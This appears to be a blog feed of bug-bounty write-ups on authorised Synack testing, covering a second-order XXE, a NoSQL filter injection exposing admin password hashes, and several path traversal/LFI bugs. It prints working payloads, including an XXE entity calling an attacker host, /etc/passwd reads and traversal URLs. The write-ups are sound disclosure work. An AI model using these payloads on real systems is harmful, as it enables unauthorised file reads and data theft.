      <description>Hello, guys!
This writeup is about my recent discovery on Synack Red Team which was a Second Order XXE that allowed me to read files stored on the web server.
Please note that this article is not about how/why/when of the XXE attacks. This is just a single case of a non-trivial interesting XXE that I found and seems worth sharing. If you want to learn more about XXEs, you may refer to the following links:</description>
      <content>&lt;p&gt;Hello, guys!&lt;/p&gt;
&lt;p&gt;This writeup is about my recent discovery on Synack Red Team which was a Second Order XXE that allowed me to read files stored on the web server.&lt;/p&gt;
&lt;p&gt;Please note that this article is not about how/why/when of the XXE attacks. This is just a single case of a non-trivial interesting XXE that I found and seems worth sharing. If you want to learn more about XXEs, you may refer to the following links:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity&#34;&gt;HackTricks XXE&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://portswigger.net/web-security/xxe&#34;&gt;Portswigger XXE&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Now to the blog.&lt;/p&gt;
&lt;p&gt;A fresh target was onboarded in the morning and I hopped onto it as soon as I received the email. In the scope, there were two web applications listed along with two postman collections. I prefer postman collections over web apps so I loaded the collections with their environments into my postman.&lt;/p&gt;
&lt;p&gt;After sending the very first request, I noticed that the application was using SOAP API to transfer the data. I tried to perform XXE in the SOAP body but the application threw an error saying &amp;ldquo;&lt;strong&gt;DOCTYPE is not allowed&lt;/strong&gt;&amp;rdquo;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://kuldeep.io/DOCTYPENotAllowed.png&#34; alt=&#34;DOCTYPENotAllowed&#34;&gt;&lt;/p&gt;
&lt;p&gt;Here, we cannot perform XXE as &lt;code&gt;DOCTYPE&lt;/code&gt; is explicitly blocked.&lt;/p&gt;
&lt;p&gt;Upon checking all the modules one by one, I came across a module named &lt;code&gt;NormalTextRepository&lt;/code&gt; in the postman collection which had the following two requests:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;saveNormalText&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;GetNamedNormalText&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://kuldeep.io/NormalTextRepository.png&#34; alt=&#34;NormalTextRepository&#34;&gt;&lt;/p&gt;
&lt;p&gt;After sending the first &lt;code&gt;saveNormalText&lt;/code&gt; request and intercepting it in Burp Suite, I found out that it contained some HTML-encoded data that looked like this:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://kuldeep.io/HTMLEncodedData.png&#34; alt=&#34;HTMLEncodedData&#34;&gt;&lt;/p&gt;
&lt;p&gt;Upon decoding, the data looked like this:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34;?&amp;gt;
&amp;lt;normal xmlns=&amp;#34;urn:hl7-org:v3&amp;#34; xmlns:XX=&amp;#34;http://REDACTED.com/REDACTED&amp;#34;&amp;gt;&amp;lt;content XX:status=&amp;#34;normal&amp;#34; XX:state=&amp;#34;normal&amp;#34;&amp;gt;Synacktest&amp;lt;/content&amp;gt;&amp;lt;/normal&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This quickly caught my attention. This was XML data being passed inside the XML body in a SOAP request (Inception vibes).&lt;/p&gt;
&lt;p&gt;I went on to try XXE here as well. For this, I copy pasted a simple Blind XXE payload from &lt;a href=&#34;https://portswigger.net/web-security/xxe/blind&#34;&gt;PortSwigger&lt;/a&gt;:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY % xxe SYSTEM &amp;#34;http://f2g9j7hhkax.web-attacker.com/XXETEST&amp;#34;&amp;gt; %xxe; ]&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I used Synack&amp;rsquo;s provided web server to test for this. Upon checking its logs, I found out that there indeed was a hit for the &lt;code&gt;/XXETEST&lt;/code&gt; endpoint.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://kuldeep.io/TUPoCHit.png&#34; alt=&#34;TUPoCHit&#34;&gt;&lt;/p&gt;
&lt;p&gt;This still was a blind XXE and I had to turn it into a full XXE in order to receive a full payout. I tried different file read payloads from &lt;a href=&#34;https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection&#34;&gt;PayloadsAllTheThings&lt;/a&gt; and &lt;a href=&#34;https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity&#34;&gt;HackTricks&lt;/a&gt; but they did not seem to work in my case.&lt;/p&gt;
&lt;p&gt;In my case, the XXE was not reflected anywhere in the response. This is why it was comparatively difficult to exploit.&lt;/p&gt;
&lt;p&gt;After poking for a while, I gave up with the idea of full XXE and went ahead to check if an internal port scan was possible or not as we were able to send HTTP requests.&lt;/p&gt;
&lt;p&gt;I sent the request to Burp Suite&amp;rsquo;s intruder and fuzzed for the ports from 1 to 1000. The payload for that looked like the following:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY % xxe SYSTEM &amp;#34;http://127.0.0.1:§1§/XXETEST&amp;#34;&amp;gt; %xxe; ]&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;However, the result of the intruder was just not making any sense to me. All the ports that I fuzzed were throwing random time delays.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://kuldeep.io/IntruderPortScan.png&#34; alt=&#34;IntruderPortScan&#34;&gt;&lt;/p&gt;
&lt;p&gt;Lost all hope and was about to give up on this XXE once again. Then a thought struck my head. &amp;ldquo;If this data is being saved in the application, it has to be retriveable in some way as well&amp;rdquo;. I checked the other &lt;code&gt;GetNamedNormalText&lt;/code&gt; request in this module and instantly felt stupid. This request retrieved the data that we saved from the first &lt;code&gt;saveNormalText&lt;/code&gt; request.&lt;/p&gt;
&lt;p&gt;I used the following XXE file read payload and saved the data:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&amp;lt;!DOCTYPE foo [&amp;lt;!ENTITY example SYSTEM &amp;#34;/etc/passwd&amp;#34;&amp;gt; ]&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Then sent the second &lt;code&gt;GetNamedNormalText&lt;/code&gt; request to retrieve the saved data. And in the response, I could see the contents of the &lt;code&gt;/etc/passwd&lt;/code&gt; file!&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://kuldeep.io/EtcPasswd.png&#34; alt=&#34;/etc/passwd&#34;&gt;&lt;/p&gt;
&lt;p&gt;This was enough for a proof of concept. However, looking at the &lt;strong&gt;JSESSIONCOOKIE&lt;/strong&gt;, I could tell that the application was built using Java. And, in Java applications, if you just provide a directory instead of a file, it will list down the contents of that directory and return it.&lt;/p&gt;
&lt;p&gt;To confirm this theory, I just removed the &lt;code&gt;/passwd&lt;/code&gt; portion from the above file read payload. The updated payload looked like this:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&amp;lt;!DOCTYPE foo [&amp;lt;!ENTITY example SYSTEM &amp;#34;/etc&amp;#34;&amp;gt; ]&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Upon saving the above payload and retrieving it using the second request, we could see the directory listing of the &lt;code&gt;/etc&lt;/code&gt; directory!&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://kuldeep.io/EtcDirectoryList.png&#34; alt=&#34;/etc Directory Listing&#34;&gt;&lt;/p&gt;
&lt;p&gt;Sent it to Synack and they happily triaged it within approximately 2 hours.&lt;/p&gt;
&lt;p&gt;Thank you for reading. :)&lt;/p&gt;

      <description>Hello, folks!
This article is going to be about my recent discovery on Synack Red Team which was a NoSQL injection.
I asked if I should do a write-up or not in my Twitter and a lot of you responded with a writeup. Therefore, I am writing this article to showcase the finding.
Please note that this will not be a technical guide on why NoSQL injections exist and their breakdown.</description>
      <content>&lt;p&gt;Hello, folks!&lt;/p&gt;
&lt;p&gt;This article is going to be about my recent discovery on Synack Red Team which was a NoSQL injection.&lt;/p&gt;
&lt;p&gt;I asked if I should do a write-up or not in my &lt;a href=&#34;https://twitter.com/kuldeepdotexe/status/1507023576888934406?s=20&amp;amp;t=nWRb1rUsGdZzuTHbcgSotA&#34;&gt;Twitter&lt;/a&gt; and a lot of you responded with a writeup. Therefore, I am writing this article to showcase the finding.&lt;/p&gt;
&lt;p&gt;Please note that this will not be a technical guide on why NoSQL injections exist and their breakdown. I will just share the thought process and approach that I had when testing this particular application.&lt;/p&gt;
&lt;p&gt;So, when I got onboarded to this program, it had one application in scope. It was an authenticated test and credentials were provided by the client. Synack&amp;rsquo;s quality period was also going on and it had approximately 8 hours.&lt;/p&gt;
&lt;p&gt;As always, I fired up Burp Suite, opened Burp&amp;rsquo;s in-built browser, went to the login page, and started intercepting.&lt;/p&gt;
&lt;p&gt;I was closely monitoring every request after clicking &amp;ldquo;Login&amp;rdquo;.&lt;/p&gt;
&lt;p&gt;First, there was a login request to the &lt;code&gt;/oauth2/token&lt;/code&gt; endpoint. This endpoint returned the JWT token that allowed us to access the application APIs. However, no fun here.&lt;/p&gt;
&lt;p&gt;After the login request, there was another request to a metadata endpoint. This also was not very interesting as the endpoint returned data that was going to be used to render the frontend.&lt;/p&gt;
&lt;p&gt;But after the first two requests, a request to the &lt;code&gt;/api/[CLIENT_NAME]/Customers&lt;/code&gt;  was sent. This request in particular was very interesting as it had a parameter named &lt;code&gt;$filter&lt;/code&gt;. And the parameter had a long NoSQL string inside it.&lt;/p&gt;
&lt;p&gt;The request looked like this:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;GET /api/[CLIENT_NAME]/Customers?$filter=(id%20eq%202)%20and%20((is_active%20eq%20%27Y%27)%20and%20(is_deleted%20eq%20%27N%27))&amp;amp;$orderby=name HTTP/1.1
Host: [TARGET_APPLICATION]
...
[SNIPPED_BECAUSE_IRRELEVANT]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If you look at the value of the &lt;code&gt;$filter&lt;/code&gt; parameter, the URL encoded string decodes to the following filter:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;(id eq 2) and ((is_active eq &amp;#39;Y&amp;#39;) and (is_deleted eq &amp;#39;N&amp;#39;))
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This endpoint returned basic customer information like customer name, last login date, etc.&lt;/p&gt;
&lt;p&gt;You can see the full request-response pair below:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://kuldeep.io/customers.png&#34; alt=&#34;Request - Response pair&#34;&gt;&lt;/p&gt;
&lt;p&gt;I had read a few blogs on NoSQL injection in past. Especially after the HackIM CTF. So, I figured this was something related to NoSQL.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;eq&lt;/code&gt; in the &lt;code&gt;$filter&lt;/code&gt; is the same as SQL&amp;rsquo;s &lt;code&gt;=&lt;/code&gt; or &lt;code&gt;LIKE&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;So, what the endpoint really did was that it read the value of &lt;code&gt;$filter&lt;/code&gt; and then it evaluated the filter and retrieved the data specified in the filter.&lt;/p&gt;
&lt;p&gt;To break down the parameters in the above filter,&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;id&lt;/code&gt; (This was the customer ID. Our current user had the customer ID of 2. If I had changed it to 1 instead of 2, this would have been an easy IDOR.)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;is_active&lt;/code&gt; (This was an attribute our user had. The &lt;code&gt;is_active&lt;/code&gt; attribute would be &lt;code&gt;Y&lt;/code&gt; if our user was active and &lt;code&gt;N&lt;/code&gt; if not.)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;id_deleted&lt;/code&gt; (This was another attribute to specify if our user was deleted or not.)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;So, the &lt;code&gt;/api/[CLIENT_NAME]/Customers&lt;/code&gt; endpoint took the filter and returned our own user(user ID 2)&amp;rsquo;s data &lt;strong&gt;if and only if&lt;/strong&gt; our user was active &lt;strong&gt;and&lt;/strong&gt; not deleted.&lt;/p&gt;
&lt;p&gt;For testing, I removed the later part which was &lt;code&gt;((is_active eq &#39;Y&#39;) and (is_deleted eq &#39;N&#39;))&lt;/code&gt; and just sent the following filter:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$filter=(id eq 2)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The application happily returned my data without erroring out.&lt;/p&gt;
&lt;p&gt;As I was aware that this was NoSQL, I googled &amp;ldquo;NoSQL wildcards&amp;rdquo; and tried to play around with wild cards. I came across the following documentation by MongoDB on wildcard indices: &lt;a href=&#34;https://www.mongodb.com/docs/manual/core/index-wildcard/&#34;&gt;https://www.mongodb.com/docs/manual/core/index-wildcard/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;I played around with wild cards doing things like &lt;code&gt;$filter=($** eq 2)&lt;/code&gt; and some of it worked meanwhile some of it did not.&lt;/p&gt;
&lt;p&gt;I also tried to forcefully put wild cards in the value and crafted this payload: &lt;code&gt;$filter=(id eq $**)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;But it did not have a valid syntax so it also failed.&lt;/p&gt;
&lt;p&gt;I honestly did not put much effort into wildcards as I was not getting the syntax right.&lt;/p&gt;
&lt;p&gt;Then a thought popped into my mind. There was one operator in the filter called &lt;code&gt;eq&lt;/code&gt;. What if I use some other operator? Is it possible to do it?&lt;/p&gt;
&lt;p&gt;I googled &amp;ldquo;MongoDB syntax&amp;rdquo; which led me to this awesome documentation again by MongoDB: &lt;a href=&#34;https://www.mongodb.com/docs/manual/tutorial/query-documents/&#34;&gt;https://www.mongodb.com/docs/manual/tutorial/query-documents/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://kuldeep.io/querydocuments.png&#34; alt=&#34;Query Documents&#34;&gt;&lt;/p&gt;
&lt;p&gt;The above documentation very nicely explains MongoDB syntax with SQL alternative syntax to properly understand it.&lt;/p&gt;
&lt;p&gt;However, after going a little further into the documentation, the documentation linked to another documentation page which was about &amp;ldquo;Query and Projection Operators&amp;rdquo;. You can find it here: &lt;a href=&#34;https://www.mongodb.com/docs/manual/reference/operator/query/&#34;&gt;https://www.mongodb.com/docs/manual/reference/operator/query/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://kuldeep.io/reference.png&#34; alt=&#34;Reference&#34;&gt;&lt;/p&gt;
&lt;p&gt;And, this page was exactly what I needed to craft my exploit! The page listed down all the MongoDB operators and their use cases.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://kuldeep.io/operators.png&#34; alt=&#34;Operators&#34;&gt;&lt;/p&gt;
&lt;p&gt;I decided to go with the &lt;code&gt;gt&lt;/code&gt; operator because I wanted the endpoint to return user details of all the users whose user ID was greater than 0. I had made an assumption that user IDs will start from zero.&lt;/p&gt;
&lt;p&gt;For that purpose, I crafted the following payload:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$filter=(id gt 0)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And the application returned the customer information of the other user as well. Sadly there were only two users and this was a pre-production application. However, I still was happy because I got the info of the other user.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://kuldeep.io/customers-pwned.png&#34; alt=&#34;Customers Pwned&#34;&gt;&lt;/p&gt;
&lt;p&gt;I was still not happy with the results because only basic login information was leaked. Any sort of PII or sensitive information was not leaked from this endpoint.&lt;/p&gt;
&lt;p&gt;I went back to my Burp history and found all the endpoints that had this &lt;code&gt;$filter&lt;/code&gt; parameter. I had gathered a total of 7 endpoints.&lt;/p&gt;
&lt;p&gt;Closely inspecting the endpoints, I found one interesting endpoint called &lt;code&gt;/api/[CLIENT_NAME]/CustomerLogins&lt;/code&gt;. This was interesting because it took the filter as well as returned PII in the response.&lt;/p&gt;
&lt;p&gt;I used the same payload as above and sent the request. And the application leaked email address, username, password hash, and phone number! And that too of the administrator user. Not just any random user.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://kuldeep.io/passworddump.png&#34; alt=&#34;Password Dump&#34;&gt;&lt;/p&gt;
&lt;p&gt;I reported all the endpoints and wrote a nice report. There were few other reports for the same vulnerability after the QR had ended but my report managed to win.&lt;/p&gt;
&lt;p&gt;Thanks for the read. :)&lt;/p&gt;

      <description>Hi, guys!
This blog will be about all the different kinds of Path Traversals and Local File Inclusion vulnerabilities that I have found in Synack Red Team.
After hacking on Synack Red Team for approximately 9 months, I came to realise that Path Traversal and LFI like vulnerabilities are very common. I reported few authenticated vulnerabilities and few unauthenticated. However, I will try to cover both kinds of vulnerabilities.
Before moving forward, I&amp;rsquo;d like to list all my Path Traversal/LFI submissions.</description>

&lt;h4 id=&#34;path-traversal-vulnerability-leads-to-source-code-disclosure&#34;&gt;Path Traversal Vulnerability Leads To Source Code Disclosure&lt;/h4&gt;
&lt;p&gt;This was the very first Path Traversal vulnerability that I had found in Synack Red Team. Also, even though I was pretty new to the platform and to the whole bug bounty thing in general, this report won the quality round so I am very proud of this particular report.&lt;/p&gt;
&lt;p&gt;After logging into the application, the application provided a bunch of sections like manage vendors, manage inventory, etc with a bunch of functionalities.&lt;/p&gt;
&lt;p&gt;Upon further inspecting these sections, I came across an interesting functionality that involved importing the data. The file was named &lt;code&gt;DataImport.view&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://kuldeep.io/DataImport.png&#34; alt=&#34;DataImport.view&#34;&gt;&lt;/p&gt;
&lt;p&gt;I tried getting RCE by uploading a web shell and it actually worked! However, that&amp;rsquo;s a different story. We want to discuss Path Traversals here and not RCEs.&lt;/p&gt;
&lt;p&gt;So, after successfully uploading a file, we were given the functionality to read the file.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://kuldeep.io/ReadFile.png&#34; alt=&#34;ReadFile&#34;&gt;&lt;/p&gt;
&lt;p&gt;After clicking the &amp;ldquo;&lt;strong&gt;ReadFile&lt;/strong&gt;&amp;rdquo; button, it filled the file name field to the current uploaded filename by default. However, we had the ability to change the file name.&lt;/p&gt;
&lt;p&gt;Now, I just had to provide a valid file name. For this, I used the &lt;code&gt;Auth.aspx&lt;/code&gt; to which the login request was sent. I could be sure that this exists because a login request was sent to this file and it resided in the webroot.&lt;/p&gt;
&lt;p&gt;So, I tried to do path traversal using payloads like &lt;code&gt;../Auth.aspx&lt;/code&gt; and &lt;code&gt;../../Auth.aspx&lt;/code&gt; etc.&lt;/p&gt;
&lt;p&gt;And, after three &lt;code&gt;../&lt;/code&gt; sequences, the file was actually returned!&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://kuldeep.io/Auth.png&#34; alt=&#34;Auth.aspx&#34;&gt;&lt;/p&gt;
&lt;p&gt;The response looked like this:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://kuldeep.io/AuthResponse.png&#34; alt=&#34;AuthResponse&#34;&gt;&lt;/p&gt;
&lt;p&gt;The file was broken because some sort of XML parsing was done on it. I still went ahead and reported it because it was still a path traversal issue and disclosed source code contents.&lt;/p&gt;
&lt;p&gt;I could do more creative things here like pulling more sensitive files but I stopped here because very limited time was left in the quality round. I initially did not care much for this vulnerability as I had already reported an RCE there but then quickly made a report in under 15 minutes putting together all my PoCs and I still won the quality round.&lt;/p&gt;
&lt;h4 id=&#34;local-file-inclusion-in-vmware-vcenter-running-at-redacted&#34;&gt;Local File Inclusion in VMWare VCenter running at [REDACTED]&lt;/h4&gt;
&lt;p&gt;This was the classic VMWare VCenter &lt;code&gt;/eam/vib&lt;/code&gt; LFI vulnerability.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;/eam/vib&lt;/code&gt; endpoint in VMWare VCenter instances takes a parameter named &lt;code&gt;id&lt;/code&gt; in the GET request. The value to this &lt;code&gt;id&lt;/code&gt; parameter is a file name that will be retrieved by the VCenter instance and will be given back in the response.&lt;/p&gt;
&lt;p&gt;There are already many resources regarding this particular vulnerability and I do not think much is to be said about it in this particular article.&lt;/p&gt;
&lt;p&gt;I used the following payload to retrieve the &lt;code&gt;hosts&lt;/code&gt; file off the remote server:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;https://[REDACTED]/eam/vib?id=C:/WINDOWS/System32/drivers/etc/hosts
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;There were some IP to host mappings in the &lt;code&gt;hosts&lt;/code&gt; file which I thought was enough for impact but with creativity, more could have been achieved.&lt;/p&gt;
&lt;p&gt;I reported the issue during the quality round and this also won the QR.&lt;/p&gt;
&lt;h4 id=&#34;spring-boot-path-traversal---cve-2020-5410&#34;&gt;Spring Boot Path Traversal - CVE-2020-5410&lt;/h4&gt;
&lt;p&gt;This was a known vulnerability in Spring Boot Cloud Config server. For PoC, I referred to this article here: &lt;a href=&#34;http://www.jrasp.com/case/CVE-2020-5410.html&#34;&gt;http://www.jrasp.com/case/CVE-2020-5410.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;That article talks in detail about the vulnerability and also explains the source code.&lt;/p&gt;
&lt;p&gt;I did not read that much and simply took the PoC from there and used it on the target that I had for testing. And the exploit worked!&lt;/p&gt;
&lt;p&gt;I used the same payload as in the PoC which is:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;https://[REDACTED]/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The above payload retrieves the &lt;code&gt;/etc/passwd&lt;/code&gt; file.&lt;/p&gt;
&lt;p&gt;However, this was Java and one odd thing about Java Path Traversals/LFIs is that if you specify a directory instead of a file for opening, it will actually list the content of that directory.&lt;/p&gt;
&lt;p&gt;So, for example, if I did not know what files were in the &lt;code&gt;/etc&lt;/code&gt; directory, I would simply use the following payload to list all the files:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;https://[REDACTED]/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%23foo/development
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This is just the previous payload with the trailing &lt;code&gt;/passwd&lt;/code&gt; removed. Now, we are just listing the contents of the &lt;code&gt;/etc&lt;/code&gt; directory.&lt;/p&gt;
&lt;p&gt;I used this feature to list the contents of the root directory in the affected Linux server. In the root directory, I found a file named &lt;code&gt;application.jar&lt;/code&gt; which was potentially the source code of the currently running Spring Boot Cloud Config server.&lt;/p&gt;
&lt;p&gt;Also, the root directory had a file &lt;code&gt;.dockerenv&lt;/code&gt; so I was quite sure that I was in a docker container.&lt;/p&gt;
&lt;p&gt;However, Synack Red Team has the stop-and-report policy according to which, we are not supposed to do post-exploitation.&lt;/p&gt;
&lt;p&gt;I reported the issue during the 8 hours long quality period. And nobody had checked for this particular vulnerability and mine was the only report in QR.&lt;/p&gt;
&lt;h4 id=&#34;local-file-inclusion-in-downloadphp&#34;&gt;Local File Inclusion In download.php&lt;/h4&gt;
&lt;p&gt;I have already discussed this vulnerability in my previous article and you can find it here: &lt;a href=&#34;https://kuldeep.io/posts/120-days-of-high-frequency-hunting/#local-file-inclusion-in-downloadphp&#34;&gt;Local File Inclusion In download.php&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&#34;path-traversal-allows-to-download-licence-keys&#34;&gt;Path Traversal Allows To Download Licence Keys&lt;/h4&gt;
&lt;p&gt;This path traversal was also very interesting. This was in a custom-built application and it did not require any authentication.&lt;/p&gt;
&lt;p&gt;When we visited the webroot, the web application redirected us to the login page.&lt;/p&gt;
&lt;p&gt;The login page was custom built and there was a brand logo along with the login page so I cannot show you the screenshots.&lt;/p&gt;
&lt;p&gt;Upon visiting the login page, a request to the &lt;code&gt;/web/product_logo&lt;/code&gt; endpoint was sent. The request contained a GET parameter named &lt;code&gt;logo&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Overall, the request URL looked like this:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;https://[REDACTED]/web/product_logo?logo=logo.png
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The parameter &lt;code&gt;logo&lt;/code&gt; took a file name as the input and returned that particular file in the response. In this case, it was &lt;code&gt;logo.png&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Now, as this is functionality to read files, there may be a potential LFI/Path Traversal here. So, I changed the file name to &lt;code&gt;index&lt;/code&gt; with different extensions. However, none of them worked.&lt;/p&gt;
&lt;p&gt;So, I ran &lt;code&gt;ffuf&lt;/code&gt; hoping to discover more files but it was a failure. I used the &lt;code&gt;raft-small-files-lowercase.txt&lt;/code&gt; provided in the &lt;a href=&#34;https://github.com/danielmiessler/SecLists&#34;&gt;SecLists&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;I did not know the underlying technology which is used so it was quite painful to enumerate files.&lt;/p&gt;
&lt;p&gt;However, I knew it was a Windows box because of the case-insensitive directory structure. What it basically means is that, in Windows, &lt;code&gt;WinDows&lt;/code&gt; and &lt;code&gt;Windows&lt;/code&gt; are the same directories/files as it is not case sensitive. And when I was doing my recon, I received the same response when I did &lt;code&gt;/web&lt;/code&gt; or &lt;code&gt;/Web&lt;/code&gt; so I was quite sure it was a Windows box.&lt;/p&gt;
&lt;p&gt;There are other ways to determine this too but I decided to assume it was Windows.&lt;/p&gt;
&lt;p&gt;Same as my past submissions, I decided to read the &lt;code&gt;C:/WINDOWS/System32/drivers/etc/hosts&lt;/code&gt; file of the remote server.&lt;/p&gt;
&lt;p&gt;So, I used a path traversal payload and the final URL looked like this:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;https://[REDACTED]/web/product_logo?logo=../WINDOWS/System32/drivers/etc/hosts
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;However, one &lt;code&gt;../&lt;/code&gt; sequence did not work. So I kept increasing the &lt;code&gt;../&lt;/code&gt; sequences.&lt;/p&gt;
&lt;p&gt;Finally after 10 &lt;code&gt;../&lt;/code&gt; sequences, I finally hit the &lt;code&gt;hosts&lt;/code&gt; file and the server retrieved it for us.&lt;/p&gt;
&lt;p&gt;The final payload looked like this:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;https://[REDACTED]/web/product_logo?logo=../../../../../../../../../../WINDOWS/System32/drivers/etc/hosts
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Although this was enough for PoC, I decided to dig deeper with this path traversal.&lt;/p&gt;
&lt;p&gt;When I was fuzzing the application, I encountered an error that disclosed the full path to the webroot.&lt;/p&gt;
&lt;p&gt;I ran &lt;code&gt;ffuf&lt;/code&gt; again but now in the webroot of the server using the path traversal that I had found. This way, I was able to enumerate a file named &lt;code&gt;LICENSE&lt;/code&gt; that had license keys of the application.&lt;/p&gt;
&lt;p&gt;I reported the issue with all my findings and the report won the QR.&lt;/p&gt;
&lt;p&gt;Thanks for the read. :)&lt;/p&gt;

      <description>Hi, guys!
